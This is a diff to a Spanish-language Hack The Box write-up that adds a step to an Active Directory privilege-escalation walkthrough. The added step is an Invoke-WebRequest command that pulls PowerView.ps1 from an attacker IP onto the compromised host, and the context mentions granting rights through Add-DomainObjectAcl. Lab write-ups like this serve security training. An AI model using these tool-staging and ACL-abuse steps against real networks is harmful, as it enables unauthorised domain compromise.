@@ -199,6 +199,10 @@ $Cred = New-Object System.Management.Automation.PSCredential('htb.local\jaime', 
 Con el objeto creado podemos manipularlo con `Add-DomainObjectAcl` para darle el usuario con las credenciales y asignarle privilegios 
 
 Para poder hacerlo tenemos que cargar el modulo de `PowerViex.ps1` 
+Nos lo descargamos en la maquina atacante y nos lo traemos a la victima con
+```shell
+Invoke-WebRequest -Uri "http://10.10.14.19/PowerView.ps1" -OutFile "C:\Users\svc-alfresco\Desktop\bh\PowerView.ps1"
 
+```
 
 
